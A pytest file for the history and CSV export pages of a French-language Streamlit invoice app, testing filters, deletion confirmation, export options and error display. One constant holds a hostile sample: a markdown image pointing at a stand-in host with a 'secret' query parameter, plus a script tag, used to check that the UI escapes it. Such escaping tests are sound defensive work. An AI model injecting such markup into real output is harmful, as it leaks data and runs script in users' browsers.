from __future__ import annotations

from datetime import UTC, date, datetime
from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from src.ui import services
from src.ui.errors import ApiError, ApiUnavailableError
from src.ui.models import ExportFile, SummaryView
from src.ui.safe import safe

PAGES = Path(__file__).resolve().parents[2] / "src" / "ui" / "pages"
HISTORY = str(PAGES / "history.py")
EXPORT = str(PAGES / "export.py")
NOW = datetime(2026, 9, 21, 12, 0, tzinfo=UTC)
IDS = [f"3f9a1c2e-7b4d-4e8a-9c31-5d2f0a6b8e{n:02d}" for n in range(1, 4)]
HOSTILE = "![x](http://evil.example/?d=secret) <script>alert(1)</script>"


def _row(n: int = 1, **overrides) -> SummaryView:
    data = {
        "id": IDS[n - 1],
        "created_at": NOW,
        "display_name": f"facture{n}.pdf",
        "status": "high",
        "invoice_number": f"F-{n}",
        "date": "2026-09-10",
        "supplier": "Orange SA",
        "client": "Dupont",
        "total_ttc": 120.0,
    }
    data.update(overrides)
    return SummaryView(**data)


class FakeClient:
    def __init__(self, rows=None, list_error=None, export_error=None) -> None:
        self.rows = [_row(1), _row(2)] if rows is None else rows
        self.list_error = list_error
        self.export_error = export_error
        self.list_calls: list[dict] = []
        self.export_calls: list[dict] = []
        self.deleted: list[str] = []

    def check(self) -> None:
        return None

    def list_invoices(self, **kwargs):
        self.list_calls.append(kwargs)
        if self.list_error:
            raise self.list_error
        return self.rows

    def export_csv(self, **kwargs) -> ExportFile:
        self.export_calls.append(kwargs)
        if self.export_error:
            raise self.export_error
        return ExportFile(
            filename="invoices_2026-09-10_to_2026-09-10.csv", content=b"\xef\xbb\xbfa;b"
        )

    def delete(self, record_id: str) -> None:
        self.deleted.append(record_id)


def _open(monkeypatch: pytest.MonkeyPatch, page: str, client: FakeClient, **state) -> AppTest:
    monkeypatch.setattr(services, "get_client", lambda: client)
    app = AppTest.from_file(page, default_timeout=30)
    for key, value in state.items():
        app.session_state[key] = value
    return app.run()


def _button(app: AppTest, label: str):
    return next(b for b in app.button if b.label.startswith(label))


def _widget(app: AppTest, kind: str, label: str):
    return next(w for w in getattr(app, kind) if w.label == label)


# === History ===
def test_history_lists_the_invoices_with_the_default_filters(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, HISTORY, client)
    assert not app.exception and [c.value for c in app.caption] == ["2 factures trouvées"]
    assert len(app.dataframe) == 1 and len(app.dataframe[0].value) == 2
    assert client.list_calls == [
        {"query": None, "date_from": None, "date_to": None, "status": None, "limit": 500}
    ]


def test_actions_are_disabled_until_something_is_selected(monkeypatch) -> None:
    app = _open(monkeypatch, HISTORY, FakeClient())
    assert all(b.disabled for b in app.button)


def test_the_filters_are_sent_to_the_api(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, HISTORY, client)
    _widget(app, "text_input", "Recherche").set_value("  orange  ").run()
    _widget(app, "date_input", "Du").set_value(date(2026, 8, 1)).run()
    _widget(app, "date_input", "Au").set_value(date(2026, 9, 1)).run()
    _widget(app, "selectbox", "Fiabilité").set_value("⚠️ À vérifier").run()
    assert client.list_calls[-1] == {
        "query": "orange",  # trimmed
        "date_from": date(2026, 8, 1),
        "date_to": date(2026, 9, 1),
        "status": "low",
        "limit": 500,
    }


def test_the_singular_is_used_for_one_invoice(monkeypatch) -> None:
    app = _open(monkeypatch, HISTORY, FakeClient([_row(1)]))
    assert [c.value for c in app.caption] == ["1 facture trouvée"]


def test_an_empty_history_guides_the_user(monkeypatch) -> None:
    app = _open(monkeypatch, HISTORY, FakeClient([]))
    assert "Envoyez un PDF" in app.info[0].value and not app.dataframe


def test_no_match_says_so_when_filters_are_set(monkeypatch) -> None:
    client = FakeClient([])
    app = _open(monkeypatch, HISTORY, client)
    _widget(app, "text_input", "Recherche").set_value("zzz").run()
    assert "ne correspond" in app.info[0].value


@pytest.mark.parametrize(
    "error", [ApiError(503, "Serveur occupé."), ApiUnavailableError("API injoignable.")]
)
def test_an_api_problem_is_shown_as_a_message(monkeypatch, error) -> None:
    app = _open(monkeypatch, HISTORY, FakeClient(list_error=error))
    assert not app.exception and len(app.error) == 1 and not app.dataframe


def test_hitting_the_row_limit_is_flagged(monkeypatch) -> None:
    rows = [_row(1) for _ in range(500)]
    app = _open(monkeypatch, HISTORY, FakeClient(rows))
    assert any("limités aux 500" in w.value for w in app.warning)


def test_hostile_supplier_is_shown_as_plain_text(monkeypatch) -> None:
    app = _open(monkeypatch, HISTORY, FakeClient([_row(1, supplier=HOSTILE, display_name=HOSTILE)]))
    assert not app.exception
    assert app.dataframe[0].value.iloc[0]["Fournisseur"] == HOSTILE  # literal, never markup


def test_deleting_the_selection_asks_for_confirmation_first(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, HISTORY, client, history_pending_delete=IDS[:2])
    assert "2" in app.warning[0].value and "définitivement" in app.warning[0].value
    assert client.deleted == []  # nothing is erased before the user confirms


def test_confirming_erases_only_the_pending_invoices_and_reports(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, HISTORY, client, history_pending_delete=IDS[:2])
    _button(app, "Oui, supprimer").click().run()
    assert client.deleted == IDS[:2]
    assert "history_pending_delete" not in app.session_state
    assert any("2 facture(s) supprimée(s)" in s.value for s in app.success)


def test_cancelling_erases_nothing(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, HISTORY, client, history_pending_delete=IDS[:2])
    _button(app, "Annuler").click().run()
    assert client.deleted == [] and "history_pending_delete" not in app.session_state
    assert not any("Oui, supprimer" == b.label for b in app.button)


# === Export ===
def test_export_shows_a_preview_and_the_default_columns(monkeypatch) -> None:
    app = _open(monkeypatch, EXPORT, FakeClient())
    assert not app.exception
    assert [(m.label, m.value) for m in app.metric] == [("Aperçu", "2 factures · 6 colonnes")]
    assert not _button(app, "📄").disabled
    assert not app.get("download_button")  # nothing to download before preparing


def test_preparing_offers_the_download_with_the_warning(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, EXPORT, client)
    _button(app, "📄").click().run()

    assert client.export_calls == [
        {
            "kind": "invoices",
            "locale": "fr",
            "columns": [
                "date",
                "invoice_number",
                "supplier",
                "subtotal_ht",
                "tva_amount",
                "total_ttc",
            ],
            "date_from": None,
            "date_to": None,
            "status": None,
        }
    ]
    download = app.get("download_button")
    assert len(download) == 1 and "invoices_2026-09-10_to_2026-09-10.csv" in download[0].proto.label
    assert any("sort du chiffrement" in w.value for w in app.warning)


def test_changing_a_choice_invalidates_the_prepared_file(monkeypatch) -> None:
    app = _open(monkeypatch, EXPORT, FakeClient())
    _button(app, "📄").click().run()
    assert app.get("download_button")
    _widget(app, "radio", "Format des nombres").set_value(
        "International (séparateur « , », point décimal)"
    ).run()
    assert not app.get("download_button")  # the file no longer matches what is on screen
    assert any("préparez à nouveau" in c.value for c in app.caption)


def test_the_lines_file_has_no_column_choice(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, EXPORT, client)
    _widget(app, "radio", "Contenu").set_value("Lignes de facturation (une ligne par ligne)").run()
    assert not app.multiselect  # the columns only concern the invoices file
    _button(app, "📄").click().run()
    assert client.export_calls[-1]["kind"] == "lines" and "columns" not in client.export_calls[-1]


def test_no_column_chosen_is_explained_and_blocks_the_export(monkeypatch) -> None:
    app = _open(monkeypatch, EXPORT, FakeClient())
    app.multiselect[0].set_value([]).run()
    assert any("au moins une colonne" in e.value for e in app.error)
    assert _button(app, "📄").disabled


def test_a_reversed_period_is_explained(monkeypatch) -> None:
    app = _open(monkeypatch, EXPORT, FakeClient())
    _widget(app, "date_input", "Du").set_value(date(2026, 9, 2)).run()
    _widget(app, "date_input", "Au").set_value(date(2026, 9, 1)).run()
    assert any("précéder" in e.value for e in app.error) and _button(app, "📄").disabled


def test_the_period_and_status_are_sent(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, EXPORT, client)
    _widget(app, "date_input", "Du").set_value(date(2026, 8, 1)).run()
    _widget(app, "selectbox", "Fiabilité").set_value("✅ Fiables").run()
    _button(app, "📄").click().run()
    call = client.export_calls[-1]
    assert call["date_from"] == date(2026, 8, 1) and call["status"] == "high"


def test_a_selection_from_the_history_is_used(monkeypatch) -> None:
    client = FakeClient()
    app = _open(monkeypatch, EXPORT, client, export_ids=IDS[:2])
    assert "Sélection de l'historique (2 factures)" in app.radio[2].options[0]
    assert app.metric[0].value.startswith("2 factures")
    _button(app, "📄").click().run()
    call = client.export_calls[-1]
    assert call["ids"] == IDS[:2] and "date_from" not in call and "status" not in call


def test_the_selection_can_be_dropped(monkeypatch) -> None:
    app = _open(monkeypatch, EXPORT, FakeClient(), export_ids=IDS[:2])
    _button(app, "Ne plus utiliser").click().run()
    assert "export_ids" not in app.session_state and _widget(app, "date_input", "Du")


def test_too_many_selected_invoices_are_refused_before_calling_the_api(monkeypatch) -> None:
    client = FakeClient()
    many = [f"3f9a1c2e-7b4d-4e8a-9c31-{n:012d}" for n in range(201)]
    app = _open(monkeypatch, EXPORT, client, export_ids=many)
    assert any("200 factures maximum" in e.value for e in app.error) and _button(app, "📄").disabled
    assert client.export_calls == []


def test_an_api_refusal_on_export_is_shown_escaped(monkeypatch) -> None:
    app = _open(monkeypatch, EXPORT, FakeClient(export_error=ApiError(422, HOSTILE)))
    _button(app, "📄").click().run()
    assert app.error[0].value == safe(HOSTILE) and not app.get("download_button")


def test_an_api_problem_on_the_preview_is_shown(monkeypatch) -> None:
    app = _open(monkeypatch, EXPORT, FakeClient(list_error=ApiUnavailableError("API injoignable.")))
    assert not app.exception and len(app.error) == 1 and not app.button
